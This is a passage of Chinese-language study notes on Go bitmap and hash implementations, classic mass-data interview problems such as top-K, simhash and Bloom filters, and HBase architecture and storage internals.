	v := genValue(hashBytes[6:10])
	i := sort.Search(len(h.nodes), func(i int) bool { return h.nodes[i].spotValue >= v })

	if i == len(h.nodes) {
		i = 0
	}
	return h.nodes[i].nodeKey
}
```

# bitmap实现

```go
package bitmap

import "fmt"

//位图
type BitMap struct {
    bits []byte
    max  int
}

//初始化一个BitMap
//一个byte有8位,可代表8个数字,取余后加1为存放最大数所需的容量
func NewBitMap(max int) *BitMap {
    bits := make([]byte, (max>>3)+1)
    return &BitMap{bits: bits, max: max}
}

//添加一个数字到位图
//计算添加数字在数组中的索引index,一个索引可以存放8个数字
//计算存放到索引下的第几个位置,一共0-7个位置
//原索引下的内容与1左移到指定位置后做或运算
func (b *BitMap) Add(num uint) {
    index := num >> 3
    pos := num & 0x07
    b.bits[index] |= 1 << pos
}

//判断一个数字是否在位图
//找到数字所在的位置,然后做与运算
func (b *BitMap) IsExist(num uint) bool {
    index := num >> 3
    pos := num & 0x07
    return b.bits[index]&(1<<pos) != 0
}

//删除一个数字在位图
//找到数字所在的位置取反,然后与索引下的数字做与运算
func (b *BitMap) Remove(num uint) {
    index := num >> 3
    pos := num & 0x07
    b.bits[index] = b.bits[index] & ^(1 << pos)
}

//位图的最大数字
func (b *BitMap) Max() int {
    return b.max
}

func (b *BitMap) String() string {
    return fmt.Sprint(b.bits)
}
```
# Hash函数实现

### 接口定义

```go
type Hash interface {
   // 嵌入了 io.Writer 接口
   // 向执行中的 hash 加入更多数据
   // hash 函数的 Write 方法永远不会返回 error
   io.Writer

   // 把当前 hash 追加到 b 的后面
   // 不会改变当前 hash 状态
   Sum(b []byte) []byte

   // 重置 hash 到初始化状态
   Reset()

   // 返回 hash 结果返回的字节数
   Size() int

   // BlockSize 返回 hash 的基础块大小
   // 为了提高效率
   // Write 方法传入的字节数最好是 blick size 的倍数
   BlockSize() int
}

// 结果为 32bit hash 函数接口
type Hash32 interface {
   Hash
   Sum32() uint32
}

// 结果为 64bit hash 函数接口
type Hash64 interface {
   Hash
   Sum64() uint64
}
```

Go 的 `hash` 包里有几种 `hash` 算法实现，分别是 `adler32，crc32/64，fnv`。

### fnv

`fnv` 是一种简单可靠的 `hash` 算法。它的结果长度有多种，`fnv.go` 中也提供了多种长度的算法实现。`fnv`核心算法很简单：先初始化 `hash`，然后循环 乘以素数 `prime32`，再与每位 `byte` 进行异或运算。

```go
const offset32        = 2166136261
const prime32         = 16777619
type sum32   uint32
func (s *sum32) Reset()   { *s = offset32 }
func (s *sum32) Size() int   { return 4 }
func (s *sum32) BlockSize() int   { return 1 }
func (s *sum32) Write(data []byte) (int, error) {
   hash := *s
   for _, c := range data {
      hash *= prime32
      hash ^= sum32(c)
   }
   *s = hash
   return len(data), nil
}
func (s *sum32) Sum32() uint32  { return uint32(*s) }
```

### adler - 可靠、快速的 hash 算法

Adler-32通过求解两个16位的数值`A、B`实现，并将结果连结成一个32位整数.
`A`就是字符串中每个字节的和，而`B`是`A`在相加时每一步的阶段值之和。在Adler-32开始运行时，`A`初始化为`1`，`B`初始化为`0`，最后的校验和要模上`65521`(小于2的16次方的最小素数)。

```go
type digest uint32
func (d *digest) Reset() { *d = 1 }

func (d *digest) Write(p []byte) (nn int, err error) {
   *d = update(*d, p)
   return len(p), nil
}

const (
   // 比 65536 小的最大素数
   mod = 65521
   // nmax is the largest n such that
   // 255 * n * (n+1) / 2 + (n+1) * (mod-1) <= 2^32-1.
   // It is mentioned in RFC 1950 (search for "5552").
   nmax = 5552
)

// Add p to the running checksum d.
func update(d digest, p []byte) digest {
   s1, s2 := uint32(d&0xffff), uint32(d>>16)
   for len(p) > 0 {
      var q []byte
      
      // 每次处理数据量为 nmax
      // 处理完之后再 % mod
      // 防止溢出，且尽可能少的执行 mod 运算
      if len(p) > nmax {
         p, q = p[:nmax], p[nmax:]
      }
      
      // 底下这两个循环我不明白为啥不合成一个？？？
      // 有明白的可以告知一声
      
      for len(p) >= 4 {
         s1 += uint32(p[0])
         s2 += s1
         s1 += uint32(p[1])
         s2 += s1
         s1 += uint32(p[2])
         s2 += s1
         s1 += uint32(p[3])
         s2 += s1
         p = p[4:]
      }
      for _, x := range p {
         s1 += uint32(x)
         s2 += s1
      }
      s1 %= mod
      s2 %= mod
      p = q
   }
   
   // 把 s2 s1 再合成一个 uint32
   return digest(s2<<16 | s1)
}
```

### crc32

`CRC`为校验和的一种，是两个字节数据流采用二进制除法（没有进位，使用XOR来代替减法）相除所得到的余数。其中被除数是需要计算校验和的信息数据流的二进制表示；除数是一个长度为 n + 1 的预定义（短）的二进制数，通常用多项式的系数来表示。在做除法之前，要在信息数据之后先加上 n 个 0。

对于 crc32 来说，IEEE 标准下的除数是 0xedb88320。除法运算效率比较低，所以生产环境一般使用的是查表法。（这块儿都是数学推导，没找到资料，也没看懂。）

以上是 hash 包中提供的几种 hash 算法。除此之外，`crypto` 包里提供了一些其他的算法也实现了 hash 接口，比如 `md5，sha1，sha256`等。

`md5`（消息摘要算法，经常有同学把 md5 错当成加密算法）是一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值。`md5`已被证实无法防止碰撞，已经不算是很安全的算法了，因此不适用于安全性认证，如`SSL公开密钥认证`或是`数字签名`等用途。对于需要高度安全性的数据，一般建议改用其他算法，比如 `sha256`。

### 素数

`hash` 算法中常用中间值对一个`素数`取模作为 `hash` 值，这是为什么呢？
一个好的散列函数要尽可能减少冲突。如果对合数取模，那么所有该函数的因子的倍数冲突的概率会增大，而质数的因子只有1和它本身，所以对于特定倍数的数字来说，会有更好的散列效果。比如：
假设 mod 是 6，对于 2 的倍数 2、4、6、8、10、12 的 hash 值是 2、4、0、2、4、0，对于 3 的倍数 3、6、9、12 的 hash 值是 3、0、3、0。
假设 mod 是 7，对于 2、4、6、8、10、12 的 hash 值是 2、4、6、1、3、5，对于 3 的倍数 3、6、9、12 的 hash 值是 3、6、2、5。
可以看出，如果 `mod` 是质数的话会得到更好的散列效果。

# 海量数据问题

## 海量数据找最热门的数据

### 寻找热门查询，300万个查询字符串中统计最热门的10个查询

**原题**：搜索引擎会通过日志文件把用户每次检索使用的所有检索串都记录下来，每个查询串的长度为1-255字节。假设目前有一千万个记录，请你统计最热门的10个查询串，要求使用的内存不能超过1G。

**分析**：这些查询串的重复度比较高，虽然总数是1千万，但如果除去重复后，不超过3百万个。一个查询串的重复度越高，说明查询它的用户越多，也就是越热门。

由上面第1题，我们知道，数据大则划为小的，例如一亿个ip求Top 10，可先%1000将ip分到1000个小文件中去，并保证一种ip只出现在一个文件中，再对每个小文件中的ip进行hash_map统计并按数量排序，最后归并或者最小堆依次处理每个小文件的top10以得到最后的结果。

但对于本题，数据规模比较小，能一次性装入内存。因为根据题目描述，虽然有一千万个Query，但是由于重复度比较高，故去除重复后，事实上只有300万的Query，每个Query255Byte，因此我们可以考虑把他们都放进内存中去（300万个字符串假设没有重复，都是最大长度，那么最多占用内存3M*1K/4=0.75G。所以可以将所有字符串都存放在内存中进行处理）。

所以我们放弃分而治之/hash映射的步骤，直接上hash_map统计，然后排序。So，针对此类典型的TOP K问题，采取的对策往往是：hash_map + 堆。

**解法**：

- 1.hash_map统计
  - 先对这批海量数据预处理。具体方法是：维护一个Key为Query字串，Value为该Query出现次数的hash_map，即hash_map(Query, Value)，每次读取一个Query，如果该字串不在Table中，那么加入该字串，并将Value值设为1；如果该字串在Table中，那么将该字串的计数加1 即可。最终我们在O(N)的时间复杂度内用hash_map完成了统计；
- 2.堆排序
  - 借助堆这个数据结构，找出Top K，时间复杂度为N‘logK。即借助堆结构，我们可以在log量级的时间内查找和调整/移动。因此，维护一个K(该题目中是10)大小的小根堆，然后遍历300万的Query，分别和根元素进行对比。所以，我们最终的时间复杂度是：O(n) + N' * O(logk），其中，N为1000万，N’为300万。

关于第2步堆排序，可以维护k个元素的最小堆，即用容量为k的最小堆存储最先遍历到的k个数，并假设它们即是最大的k个数，建堆费时O（k），并调整堆(费时O(logk))后，有k1>k2>...kmin（kmin设为小顶堆中最小元素）。继续遍历数列，每次遍历一个元素x，与堆顶元素比较，若x>kmin，则更新堆（x入堆，用时logk），否则不更新堆。这样下来，总费时O（k*logk+（n-k）*logk）=O（n*logk）。此方法得益于在堆中，查找等各项操作时间复杂度均为logk。

当然，你也可以采用trie树，关键字域存该查询串出现的次数，没有出现为0。最后用10个元素的最小推来对出现频率进行排序。

## 设计一个比较两篇文章相似度的算法

simhash算法分为5个步骤：分词、hash、加权、合并、降维，具体过程如下所述：

- 分词
  - 给定一段语句，进行分词，得到有效的特征向量，然后为每一个特征向量设置1-5等5个级别的权重（如果是给定一个文本，那么特征向量可以是文本中的词，其权重可以是这个词出现的次数）。例如给定一段语句：“CSDN博客结构之法算法之道的作者July”，分词后为：“CSDN 博客 结构 之 法 算法 之 道 的 作者 July”，然后为每个特征向量赋予权值：CSDN(4) 博客(5) 结构(3) 之(1) 法(2) 算法(3) 之(1) 道(2) 的(1) 作者(5) July(5)，其中括号里的数字代表这个单词在整条语句中的重要程度，数字越大代表越重要。
- hash
  - 通过hash函数计算各个特征向量的hash值，hash值为二进制数01组成的n-bit签名。比如“CSDN”的hash值Hash(CSDN)为100101，“博客”的hash值Hash(博客)为“101011”。就这样，字符串就变成了一系列数字。
- 加权
  - 在hash值的基础上，给所有特征向量进行加权，即W = Hash *weight，且遇到1则hash值和权值正相乘，遇到0则hash值和权值负相乘。例如给“CSDN”的hash值“100101”加权得到：W(CSDN) = 100101*4 = 4 -4 -4 4 -4 4，给“博客”的hash值“101011”加权得到：W(博客)=101011*5 = 5 -5 5 -5 5 5，其余特征向量类似此般操作。
- 合并
  - 将上述各个特征向量的加权结果累加，变成只有一个序列串。拿前两个特征向量举例，例如“CSDN”的“4 -4 -4 4 -4 4”和“博客”的“5 -5 5 -5 5 5”进行累加，得到“4+5 -4+-5 -4+5 4+-5 -4+5 4+5”，得到“9 -9 1 -1 1”。
- 降维
  - 对于n-bit签名的累加结果，如果大于0则置1，否则置0，从而得到该语句的simhash值，最后我们便可以根据不同语句simhash的海明距离来判断它们的相似度。例如把上面计算出来的“9 -9 1 -1 1 9”降维（某位大于0记为1，小于0记为0），得到的01串为：“1 0 1 0 1 1”，从而形成它们的simhash签名。

其流程如下图所示： ![img](http://dl.iteye.com/upload/attachment/437426/baf42378-e625-35d2-9a89-471524a355d8.jpg)

### 应用

- 每篇文档得到SimHash签名值后，接着计算两个签名的海明距离即可。根据经验值，对64位的 SimHash值，海明距离在3以内的可认为相似度比较高。
  - 海明距离的求法：异或时，只有在两个比较的位不同时其结果是1 ，否则结果为0，两个二进制“异或”后得到1的个数即为海明距离的大小。

举个例子，上面我们计算到的“CSDN博客”的simhash签名值为“1 0 1 0 1 1”，假定我们计算出另外一个短语的签名值为“1 0 1 0 0 0”，那么根据异或规则，我们可以计算出这两个签名的海明距离为2，从而判定这两个短语的相似度是比较高的。

## 给海量数据排序

### 背景

**给10^7个数据量的磁盘文件排序**

### 解法

* 位图方案

熟悉位图的朋友可能会想到用位图来表示这个文件集合。例如正如编程珠玑一书上所述，用一个20位长的字符串来表示一个所有元素都小于20的简单的非负整数集合，边框用如下字符串来表示集合{1,2,3,5,8,13}：

```
0 1 1 1 0 1 0 0 1 0 0 0 0 1 0 0 0 0 0 0
```

上述集合中各数对应的位置则置1，没有对应的数的位置则置0。

所以，此问题用位图的方案分为以下三步进行解决：

- 第一步，将所有的位都置为0，从而将集合初始化为空。
- 第二步，通过读入文件中的每个整数来建立集合，将每个对应的位都置为1。
- 第三步，检验每一位，如果该位为1，就输出对应的整数。

**但是内存可能不够**！

* 多路归并

分而治之，大而化小，也就是把整个大文件分为若干大小的几块，然后分别对每一块进行排序，最后完成整个过程的排序。

比如可分为2块（k=2，1趟反正占用的内存只有1.25/2M），1~4999999，和5000000~9999999。先遍历一趟，首先排序处理1~4999999之间的整数（用5000000/8=625000个字的存储空间来排序0~4999999之间的整数），然后再第二趟，对5000001~1000000之间的整数进行排序处理。

## MapReduce

MapReduce是一种计算模型，简单的说就是将大批量的工作（数据）分解（MAP）执行，然后再将结果合并成最终结果（REDUCE）。这样做的好处是可以在任务被分解后，可以通过大量机器进行并行计算，减少整个操作的时间。但如果你要我再通俗点介绍，那么，说白了，Mapreduce的原理就是一个归并排序。

适用范围：数据量大，但是数据种类小可以放入内存

基本原理及要点：将数据交给不同的机器去处理，数据划分，结果归约。

## 海量数据找不重复整数个数

### 2.5亿个整数中找出不重复的整数的个数，内存空间不足以容纳这2.5亿个整数

**解法一**：采用2-Bitmap（每个数分配2bit，00表示不存在，01表示出现一次，10表示多次，11无意义）进行，共需内存2^32 * 2 bit=1 GB内存，还可以接受。然后扫描这2.5亿个整数，查看Bitmap中相对应位，如果是00变01，01变10，10保持不变。所描完事后，查看bitmap，把对应位是01的整数输出即可。

**解法二**：也可采用与第1题类似的方法，进行划分小文件的方法。然后在小文件中找出不重复的整数，并排序。然后再进行归并，注意去除重复的元素。

## 5亿个int找它们的中位数

分治法的思想是把一个大的问题逐渐转换为规模较小的问题来求解。

对于这道题，顺序读取这 5 亿个数字，对于读取到的数字 num，如果它对应的二进制中最高位为 1，则把这个数字写到 f1 中，否则写入 f0 中。通过这一步，可以把这 5 亿个数划分为两部分，而且 f0 中的数都大于 f1 中的数（最高位是符号位）。

划分之后，可以非常容易地知道中位数是在 f0 还是 f1 中。假设 f1 中有 1 亿个数，那么中位数一定在 f0 中，且是在 f0 中，从小到大排列的第 1.5 亿个数与它后面的一个数的平均值。

> **提示**，5 亿数的中位数是第 2.5 亿与右边相邻一个数求平均值。若 f1 有一亿个数，那么中位数就是 f0 中从第 1.5 亿个数开始的两个数求得的平均值。

对于 f0 可以用次高位的二进制继续将文件一分为二，如此划分下去，直到划分后的文件可以被加载到内存中，把数据加载到内存中以后直接排序，找出中位数。

> **注意**，当数据总数为偶数，如果划分后两个文件中的数据有相同个数，那么中位数就是数据较小的文件中的最大值与数据较大的文件中的最小值的平均值。

## 海量不重复数据找指定值

### **给40亿个不重复的unsigned int的整数，没排过序的，然后再给一个数，如何快速判断这个数是否在那40亿个数当中？**

可以用位图/Bitmap的方法，申请512M的内存，一个bit位代表一个unsigned int值。读入40亿个数，设置相应的bit位，读入要查询的数，查看相应bit位是否为1，为1表示存在，为0表示不存在。

## 海量数据找共同内容

### **给你A,B两个文件，各存放50亿条URL，每条URL占用64字节，内存限制是4G，让你找出A,B文件共同的URL。如果是三个乃至n个文件呢？**

如果允许有一定的错误率，可以使用Bloom filter，4G内存大概可以表示340亿bit。将其中一个文件中的url使用Bloom filter映射为这340亿bit，然后挨个读取另外一个文件的url，检查是否与Bloom filter，如果是，那么该url应该是共同的url（注意会有一定的错误率）。

# HBase

## hbase简介

HBase 是一个分布式的、面向列的开源数据库。建立在 HDFS 之上。Hbase的名字的来源是 Hadoop database，即 Hadoop 数据库。HBase 的计算和存储能力取决于 Hadoop 集群。

它介于 NoSql 和 RDBMS 之间，仅能通过主键(row key)和主键的 range 来检索数据，仅支持单行事务(可通过 Hive 支持来实现多表 join 等复杂操作)。

HBase中表的特点：

1. 大：一个表可以有上十亿行，上百万列
2. 面向列：面向列(族)的存储和权限控制，列(族)独立检索。
3. 稀疏：**对于为空(null)的列，并不占用存储空间，因此，表可以设计的非常稀疏**。
4. 数据类型单一：HBase的数据都是字符串，没有类型
5. 数据多版本：每个单元中的数据可以有多个版本，默认情况下版本号自动分配，是单元格插入时的时间戳；

## hbase的适用场景

1. 半结构化或非结构化数据:对于数据结构字段不够确定或杂乱无章很难按一个概念去进行抽取的数据适合用HBase。
2. 记录非常稀疏:RDBMS的行有多少列是固定的，为null的列浪费了存储空间。而如上文提到的，HBase为null的Column不会被存储，这样既节省了空间又提高了读性能。
3. 多版本数据:如上文提到的根据Row key和Column key定位到的Value可以有任意数量的版本值，因此对于需要存储变动历史记录的数据，用HBase就非常方便了
4.  超大数据量:HBase会自动水平切分扩展，跟Hadoop的无缝集成保障了其数据可靠性（HDFS）和海量数据分析的高性能（MapReduce）。

## 如何设计hbase的rowKey

* Rowkey长度原则:

Rowkey 是一个二进制码流，Rowkey 的长度被很多开发者建议说设计在10~100 个字节，不过建议是越短越好，不要超过16 个字节。

**原因**：（1）数据的持久化文件HFile 中是按照KeyValue 存储的，如果Rowkey 过长比如100 个字节，1000 万列数据光Rowkey 就要占用100*1000 万=10 亿个字节，将近1G 数据，这会极大影响HFile 的存储效率；（2）MemStore 将缓存部分数据到内存，如果Rowkey 字段过长内存的有效利用率会降低，系统将无法缓存更多的数据，这会降低检索效率。因此Rowkey 的字节长度越短越好。（3）目前操作系统是都是64 位系统，内存8 字节对齐。控制在16 个字节，8 字节的整数倍利用操作系统的最佳特性。

* Rowkey散列原则：

如果Rowkey是按时间戳的方式递增，不要将时间放在二进制码的前面，建议将Rowkey的高位作为散列字段，由程序循环生成，低位放时间字段，这样将提高数据均衡分布在每个Regionserver 实现负载均衡的几率。如果没有散列字段，首字段直接是时间信息将产生所有新数据都在一个 RegionServer 上堆积的热点现象，这样在做数据检索的时候负载将会集中在个别RegionServer，降低查询效率。

* Rowkey唯一原则

必须在设计上保证其唯一性。

## hbase底层原理

### 系统架构

![HBase系统架构](https://segmentfault.com/img/remote/1460000038973781)

根据这幅图，解释下HBase中各个组件

#### Client

1. 包含访问hbase的接口，**Client维护着一些cache来加快对hbase的访问**，比如regione的位置信息.

#### zookeeper

HBase可以使用内置的Zookeeper，也可以使用外置的，在实际生产环境，为了保持统一性，一般使用外置Zookeeper。

Zookeeper在HBase中的作用：

1. 保证任何时候，集群中只有一个master
2. 存贮所有Region的寻址入口
3. 实时监控Region Server的状态，将Region server的上线和下线信息实时通知给Master

#### HMaster

1. 为Region server分配region
2. **负责region server的负载均衡**
3. 发现失效的region server并重新分配其上的region
4. HDFS上的垃圾文件回收
5. 处理schema更新请求

#### HRegion Server

1. HRegion server**维护HMaster分配给它的region**，处理对这些region的IO请求
2. HRegion server负责切分在运行过程中变得过大的region

从图中可以看到，**Client访问HBase上数据的过程并不需要HMaster参与**（寻址访问Zookeeper和HRegion server，数据读写访问HRegione server）

**HMaster仅仅维护者table和HRegion的元数据信息，负载很低。**

#### 行键Row Key

与nosql数据库一样,row key是用来检索记录的主键。访问hbase table中的行，只有三种方式：

1. 通过单个row key访问
2. 通过row key的range
3. 全表扫描

Row Key 行键可以是任意字符串(**最大长度是 64KB**，实际应用中长度一般为 10-100bytes)，在hbase内部，row key保存为字节数组。

**Hbase会对表中的数据按照rowkey排序(字典顺序)**

存储时，数据按照Row key的字典序(byte order)排序存储。设计key时，要充分排序存储这个特性，将经常一起读取的行存储放到一起。(位置相关性)。

**行的一次读写是原子操作 (不论一次读写多少列)**。这个设计决策能够使用户很容易的理解程序在对同一个行进行并发更新操作时的行为。

#### 列族 Column Family

**HBase表中的每个列，都归属于某个列族**。列族是表的schema的一部分(而列不是)，**必须在使用表之前定义**。

列名都以列族作为前缀。例如 courses:history ， courses:math 都属于 courses 这个列族。

**访问控制、磁盘和内存的使用统计都是在列族层面进行的。
列族越多，在取一行数据时所要参与IO、搜寻的文件就越多，所以，如果没有必要，不要设置太多的列族。**

#### 列 Column

列族下面的具体列，属于某一个ColumnFamily，类似于在mysql当中创建的具体的列。

#### 时间戳 Timestamp

HBase中通过row和columns确定的为一个存贮单元称为cell。每个 cell都保存着同一份数据的多个版本。版本通过时间戳来索引。时间戳的类型是 64位整型。**时间戳可以由hbase(在数据写入时自动 )赋值**，此时时间戳是精确到毫秒的当前系统时间。时间戳也可以由客户显式赋值。如果应用程序要避免数据版本冲突，就必须自己生成具有唯一性的时间戳。**每个 cell中，不同版本的数据按照时间倒序排序**，即最新的数据排在最前面。

为了避免数据存在过多版本造成的的管理 (包括存贮和索引)负担，hbase提供了两种数据版本回收方式：

1. 保存数据的最后n个版本
2. 保存最近一段时间内的版本（设置数据的生命周期TTL）。

用户可以针对每个列族进行设置。

#### Cell单元

由{row key, column( =<family> + <label>), version} 唯一确定的单元。
cell中的数据是没有类型的，全部是字节码形式存贮。

#### 版本号 VersionNum

数据的版本号，每条数据可以有多个版本号，默认值为系统时间戳，类型为Long。

### 物理存储

#### 整体架构

![HBase æ´ä½ç»æ](https://segmentfault.com/img/remote/1460000038973777)

1. Table 中的所有行都按照 Row Key 的字典序排列。
2. **Table 在行的方向上分割为多个 HRegion。**
3. HRegion按大小分割的(默认10G)，每个表一开始只有一 个HRegion，随着数据不断插入表，HRegion不断增大，当增大到一个阀值的时候，HRegion就会等分会两个新的HRegion。当Table 中的行不断增多，就会有越来越多的 HRegion。
4. **HRegion 是 HBase 中分布式存储和负载均衡的最小单元。**最小单元就表示不同的 HRegion 可以分布在不同的 HRegion Server 上。但**一个 HRegion 是不会拆分到多个 Server 上的。**
5. **HRegion 虽然是负载均衡的最小单元，但并不是物理存储的最小单元。**

事实上，HRegion 由一个或者多个 Store 组成，**每个 Store 保存一个 Column Family。**
每个 Strore 又由一个 MemStore 和0至多个 StoreFile 组成。如上图。

#### StoreFile和HFile结构

StoreFile以HFile格式保存在HDFS上。

HFile的格式为：

![HFile 格式](https://segmentfault.com/img/remote/1460000038973780)

首先HFile文件是不定长的，长度固定的只有其中的两块：Trailer和FileInfo。正如图中所示的，Trailer中有指针指向其他数 据块的起始点。

File Info中记录了文件的一些Meta信息，例如：AVG_KEY_LEN, AVG_VALUE_LEN, LAST_KEY, COMPARATOR, MAX_SEQ_ID_KEY等。

Data Index和Meta Index块记录了每个Data块和Meta块的起始点。

Data Block是HBase I/O的基本单元，为了提高效率，HRegionServer中有基于LRU的Block Cache机制。每个Data块的大小可以在创建一个Table的时候通过参数指定，大号的Block有利于顺序Scan，小号Block利于随机查询。 每个Data块除了开头的Magic以外就是一个个KeyValue对拼接而成, Magic内容就是一些随机数字，目的是防止数据损坏。

HFile里面的每个KeyValue对就是一个简单的byte数组。但是这个byte数组里面包含了很多项，并且有固定的结构。我们来看看里面的具体结构：

![HFile 具体结构](https://segmentfault.com/img/remote/1460000038973778)

开始是两个固定长度的数值，分别表示Key的长度和Value的长度。紧接着是Key，开始是固定长度的数值，表示RowKey的长度，紧接着是 RowKey，然后是固定长度的数值，表示Family的长度，然后是Family，接着是Qualifier，然后是两个固定长度的数值，表示Time Stamp和Key Type（Put/Delete）。Value部分没有这么复杂的结构，就是纯粹的二进制数据了。

HFile分为六个部分：

1. Data Block 段–保存表中的数据，这部分可以被压缩.
2. Meta Block 段 (可选的)–保存用户自定义的kv对，可以被压缩。
3. File Info 段–Hfile的元信息，不被压缩，用户也可以在这一部分添加自己的元信息。
4. Data Block Index 段–Data Block的索引。每条索引的key是被索引的block的第一条记录的key。
5. Meta Block Index段 (可选的)–Meta Block的索引。
6. Trailer–这一段是定长的。保存了每一段的偏移量，读取一个HFile时，会首先读取Trailer，Trailer保存了每个段的起始位置(段的Magic Number用来做安全check)，然后，DataBlock Index会被读取到内存中，这样，当检索某个key时，不需要扫描整个HFile，而只需从内存中找到key所在的block，通过一次磁盘io将整个 block读取到内存中，再找到需要的key。DataBlock Index采用LRU机制淘汰。

HFile的Data Block，Meta Block通常采用压缩方式存储，压缩之后可以大大减少网络IO和磁盘IO，随之而来的开销当然是需要花费cpu进行压缩和解压缩。
目前HFile的压缩支持两种方式：Gzip，Lzo。

#### Memstore与StoreFile

**一个 HRegion 由多个 Store 组成，每个 Store 包含一个列族的所有数据Store 包括位于内存的 Memstore 和位于硬盘的 StoreFile。**

写操作先写入 Memstore，当 Memstore 中的数据量达到某个阈值，HRegionServer 启动 FlashCache 进程写入 StoreFile，每次写入形成单独一个 StoreFile

当 StoreFile 大小超过一定阈值后，会把当前的 HRegion 分割成两个，并由 HMaster 分配给相应的 HRegion 服务器，实现负载均衡

**客户端检索数据时，先在memstore找，找不到再找storefile。**

#### HLog(WAL log)

WAL 意为Write ahead log，类似 mysql 中的 binlog,用来 做灾难恢复时用，Hlog记录数据的所有变更,一旦数据修改，就可以从log中进行恢复。

**每个Region Server维护一个Hlog,而不是每个Region一个**。这样不同region(来自不同table)的日志会混在一起，这样做的目的是不断追加单个文件相对于同时写多个文件而言，可以减少磁盘寻址次数，**因此可以提高对table的写性能**。带来的麻烦是，如果一台region server下线，为了**恢复其上的region，需要将region server上的log进行拆分**，然后分发到其它region server上进行恢复。

**HLog文件就是一个普通的Hadoop Sequence File：**

1. HLog Sequence File 的Key是HLogKey对象，HLogKey中记录了写入数据的归属信息，除了table和region名字外，同时还包括 sequence number和timestamp，timestamp是”写入时间”，sequence number的起始值为0，或者是最近一次存入文件系统中sequence number。
2. HLog Sequece File的Value是HBase的KeyValue对象，即对应HFile中的KeyValue，可参见上文描述。

### 读写过程

#### 读请求过程

RegionServer保存着meta表以及表数据，要访问表数据，首先Client先去访问zookeeper，从zookeeper里面获取meta表所在的位置信息，即找到这个meta表在哪个HRegionServer上保存着。

接着Client通过刚才获取到的HRegionServer的IP来访问Meta表所在的HRegionServer，从而读取到Meta，进而获取到Meta表中存放的元数据。

Client通过元数据中存储的信息，访问对应的HRegionServer，然后扫描所在HRegionServer的Memstore和Storefile来查询数据。

最后HRegionServer把查询到的数据响应给Client。

查看meta表信息

```sql
hbase(main):011:0> scan 'hbase:meta'
```

#### 写请求过程

Client也是先访问zookeeper，找到Meta表，并获取Meta表元数据。

确定当前将要写入的数据所对应的HRegion和HRegionServer服务器。

Client向该HRegionServer服务器发起写入数据请求，然后HRegionServer收到请求并响应。

Client先把数据写入到HLog，以防止数据丢失。

然后将数据写入到Memstore。

如果HLog和Memstore均写入成功，则这条数据写入成功

如果Memstore达到阈值，会把Memstore中的数据flush到Storefile中。

当Storefile越来越多，会触发Compact合并操作，把过多的Storefile合并成一个大的Storefile。

当Storefile越来越大，Region也会越来越大，达到阈值后，会触发Split操作，将Region一分为二。

细节描述：

HBase使用MemStore和StoreFile存储对表的更新。
数据在更新时首先写入Log(WAL log)和内存(MemStore)中，MemStore中的数据是排序的，**当MemStore累计到一定阈值时，就会创建一个新的MemStore**，并且将老的MemStore添加到flush队列，由单独的线程flush到磁盘上，成为一个StoreFile。于此同时，系统会在zookeeper中记录一个redo point，表示这个时刻之前的变更已经持久化了。
当系统出现意外时，可能导致内存(MemStore)中的数据丢失，此时使用Log(WAL log)来恢复checkpoint之后的数据。

**StoreFile是只读的，一旦创建后就不可以再修改。因此HBase的更新其实是不断追加的操作。当一个Store中的StoreFile达到一定的阈值后，就会进行一次合并(minor_compact, major_compact),将对同一个key的修改合并到一起，形成一个大的StoreFile，当StoreFile的大小达到一定阈值后，又会对 StoreFile进行split，等分为两个StoreFile。**

由于对表的更新是不断追加的，compact时，需要访问Store中全部的 StoreFile和MemStore，将他们按row key进行合并，由于StoreFile和MemStore都是经过排序的，并且StoreFile带有内存中索引，合并的过程还是比较快。

### HRegion管理

#### HRegion分配

任何时刻，**一个HRegion只能分配给一个HRegion Server**。HMaster记录了当前有哪些可用的HRegion Server。以及当前哪些HRegion分配给了哪些HRegion Server，哪些HRegion还没有分配。当需要分配的新的HRegion，并且有一个HRegion Server上有可用空间时，HMaster就给这个HRegion Server发送一个装载请求，把HRegion分配给这个HRegion Server。HRegion Server得到请求后，就开始对此HRegion提供服务。

#### HRegion Server上线

**HMaster使用zookeeper来跟踪HRegion Server状态**。当某个HRegion Server启动时，会首先在zookeeper上的server目录下建立代表自己的znode。由于HMaster订阅了server目录上的变更消息，当server目录下的文件出现新增或删除操作时，HMaster可以得到来自zookeeper的实时通知。因此一旦HRegion Server上线，HMaster能马上得到消息。

#### HRegion Server下线

当HRegion Server下线时，它和zookeeper的会话断开，zookeeper而自动释放代表这台server的文件上的独占锁。HMaster就可以确定：

1. HRegion Server和zookeeper之间的网络断开了。
2. HRegion Server挂了。

无论哪种情况，HRegion Server都无法继续为它的HRegion提供服务了，此时HMaster会删除server目录下代表这台HRegion Server的znode数据，并将这台HRegion Server的HRegion分配给其它还活着的节点。

### HMaster工作机制

#### master上线

master启动进行以下步骤:

1. 从zookeeper上**获取唯一一个代表active master的锁**，用来阻止其它HMaster成为master。
2. 扫描zookeeper上的server父节点，获得当前可用的HRegion Server列表。
3. 和每个HRegion Server通信，获得当前已分配的HRegion和HRegion Server的对应关系。
4. 扫描.META.region的集合，计算得到当前还未分配的HRegion，将他们放入待分配HRegion列表。

#### master下线

由于**HMaster只维护表和region的元数据**，而不参与表数据IO的过程，HMaster下线仅导致所有元数据的修改被冻结(无法创建删除表，无法修改表的schema，无法进行HRegion的负载均衡，无法处理HRegion 上下线，无法进行HRegion的合并，唯一例外的是HRegion的split可以正常进行，因为只有HRegion Server参与)，**表的数据读写还可以正常进行**。因此**HMaster下线短时间内对整个HBase集群没有影响**。

从上线过程可以看到，HMaster保存的信息全是可以冗余信息（都可以从系统其它地方收集到或者计算出来）

因此，一般HBase集群中总是有一个HMaster在提供服务，还有一个以上的‘HMaster’在等待时机抢占它的位置。

### HBase三个重要机制

#### flush机制

1.（**hbase.regionserver.global.memstore.size**）默认;堆大小的40%
regionServer的全局memstore的大小，超过该大小会触发flush到磁盘的操作,默认是堆大小的40%,而且regionserver级别的flush会阻塞客户端读写

2.（**hbase.hregion.memstore.flush.size**）默认：128M
单个region里memstore的缓存大小，超过那么整个HRegion就会flush,

3.（**hbase.regionserver.optionalcacheflushinterval**）默认：1h
内存中的文件在自动刷新之前能够存活的最长时间

4.（**hbase.regionserver.global.memstore.size.lower.limit**）默认：堆大小 *0.4* 0.95
有时候集群的“写负载”非常高，写入量一直超过flush的量，这时，我们就希望memstore不要超过一定的安全设置。在这种情况下，写操作就要被阻塞一直到memstore恢复到一个“可管理”的大小, 这个大小就是默认值是堆大小 *0.4* 0.95，也就是当regionserver级别的flush操作发送后,会阻塞客户端写,一直阻塞到整个regionserver级别的memstore的大小为 堆大小 *0.4* 0.95为止

